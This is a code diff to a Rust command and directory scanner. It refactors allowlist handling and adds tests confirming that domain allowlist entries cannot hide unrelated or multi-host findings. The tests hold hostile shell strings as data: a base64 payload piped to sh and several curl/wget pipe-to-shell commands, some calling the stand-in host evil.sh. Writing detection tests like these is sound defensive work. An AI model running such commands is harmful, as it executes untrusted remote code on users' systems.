@@ -1,10 +1,9 @@
+use std::collections::HashSet;
 use std::fs::{self, File};
 use std::io::{self, Read};
 use std::path::Path;
 
 use ignore::WalkBuilder;
-
-use std::collections::HashSet;
 
 use crate::allow::Allowlists;
 use crate::command;
@@ -90,6 +89,7 @@ impl Engine {
         self.scan_dir_with(dir, &Allowlists::empty())
     }
 
+    /// Like `scan_dir`, then hides the findings `allow` allows; they stay listed in the report.
     pub fn scan_dir_with(&self, dir: &Path, allow: &Allowlists) -> Result<Report, ScanError> {
         if !dir.is_dir() {
             return Err(ScanError::NotADirectory(dir.display().to_string()));
@@ -170,6 +170,7 @@ impl Engine {
         self.check_command_with(command, &Allowlists::empty())
     }
 
+    /// Like `check_command`, then hides the findings `allow` allows; they stay listed in the report.
     pub fn check_command_with(&self, command: &str, allow: &Allowlists) -> Report {
         let macos = cfg!(target_os = "macos");
         let mut findings: Vec<_> = self
@@ -180,11 +181,7 @@ impl Engine {
             .flat_map(|r| r.check_command(command))
             .collect();
         findings.extend(command::analyze(command, macos));
-        if let [host] = command::fetched_hosts(command).as_slice() {
-            for f in findings.iter_mut().filter(|f| f.domain.is_none()) {
-                f.domain = Some(host.clone());
-            }
-        }
+        command::stamp_fetch_domain(&mut findings, command);
         let applied = allow.apply(findings, &self.known_rule_ids());
         Report::from_rules(applied.kept)
             .with_skipped_rules(command::skipped_rules(macos))
@@ -246,6 +243,34 @@ mod tests {
             &allow,
         );
         assert_eq!(r.findings().len(), 1);
+    }
+
+    #[test]
+    fn a_domain_entry_never_hides_a_finding_that_is_not_about_the_fetch() {
+        let allow = allow_domain("command/base64-into-shell", "example.org");
+        let r = check(
+            "curl https://example.org/x -o f; echo ZXZpbA== | base64 -d | sh",
+            &allow,
+        );
+        assert_eq!(r.verdict(), crate::report::Verdict::Block);
+        assert!(r.suppressed().is_empty());
+    }
+
+    #[test]
+    fn a_domain_entry_does_not_hide_a_command_that_may_fetch_another_host() {
+        let allow = allow_domain("command/pipe-to-shell", "example.org");
+        for cmd in [
+            "curl evil.sh https://example.org/a | sh",
+            "curl --url evil.sh https://example.org/a | sh",
+            "curl -K cfg https://example.org/a | sh",
+            "wget -i list.txt -O- https://example.org/a | sh",
+            "curl https://example.org/a | sh; curl evil.sh | sh",
+            "curl https://example.org/a | sh -c \"$(curl evil.sh)\"",
+        ] {
+            let r = check(cmd, &allow);
+            assert_ne!(r.verdict(), crate::report::Verdict::Allow, "{cmd}");
+            assert!(r.suppressed().is_empty(), "{cmd}");
+        }
     }
 
     #[test]
